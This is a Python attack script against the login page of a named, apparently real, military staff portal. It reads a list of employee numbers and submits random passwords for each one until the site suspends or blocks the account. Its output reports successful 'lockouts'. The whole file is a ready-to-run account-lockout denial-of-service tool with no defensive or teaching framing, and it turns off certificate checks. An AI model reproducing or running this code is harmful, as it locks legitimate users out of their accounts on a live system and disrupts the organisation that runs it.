import random
import string
import sys
import requests
import argparse
import datetime
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
global_session = None


def get_currentTime():
    return "[" + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "]"


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--eno-list", help="Path to the E NO list.", type=str)
    parser.add_argument("--list-index", help="Position to start suspending", type=int)
    return parser.parse_args()


def generate_random_key():
    return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10))


def get_token_cookies():
    portal_get = requests.get("https://eportal.army.lk/eportal/login",
                              headers={
                                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'},
                              verify=False)
    bs_source = BeautifulSoup(portal_get.text, "html.parser")
    token = bs_source.find("input", dict(name='_token'))['value']
    return token, portal_get.cookies


def attempt_login(eno, password):
    sess = requests.Session()
    token_cookies = get_token_cookies()
    sess_resp = sess.post("https://eportal.army.lk/eportal/login",
                          data={'username': eno, 'password': password, '_token': token_cookies[0], 'remember': ''},
                          cookies=token_cookies[1],
                          headers={
                              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'},
                          verify=False)

    bs_html = BeautifulSoup(sess_resp.text, "html.parser")
    warning_msg = bs_html.find_all("div", {"class": "alert alert-warning"})
    msg = warning_msg[0].get_text().strip()
    if msg is not None and msg != '':
        if msg == "Invalid User Credentials!":
            return -1

        if msg == "Wrong Password!":
            return -2

        if msg.startswith("Account has been suspended"):
            return -3

        if msg.startswith("Your Account has been Blocked"):
            return -4

    return 0


def suspend_account(e_num):
    password = generate_random_key()
    while True:
        login_res = attempt_login(e_num, password)
        if login_res == -1:
            print("Account not found!", end='\n')
            break
        elif login_res == -2:
            suspend_account(e_num)
            break
        elif login_res == -3:
            print("Account Suspension Successful!", end='\n')
            break
        elif login_res == -4:
            print("Account is already suspended!", end='\n')
            break
        elif login_res == 0:
            print("Opps! Password is correct. Retrying with a different password...", end='\n')
            password = generate_random_key()


def read_list(path):
    eno_list = open(path, 'r')
    eno_str = eno_list.read()
    eno_list_arr = eno_str.split('\n')
    return eno_list_arr


if __name__ == "__main__":
    arguments = parse_args()
    eno_list = read_list(arguments.eno_list)
    if arguments.list_index is None:
        arguments.list_index = 0
    for i in range(0, len(eno_list)):
        eno = eno_list[i + arguments.list_index]
        print(get_currentTime() + " [" + str((i + arguments.list_index)) + "]" + " Attempting to lockout user " + eno + "... ", end='')
        suspend_account(eno)
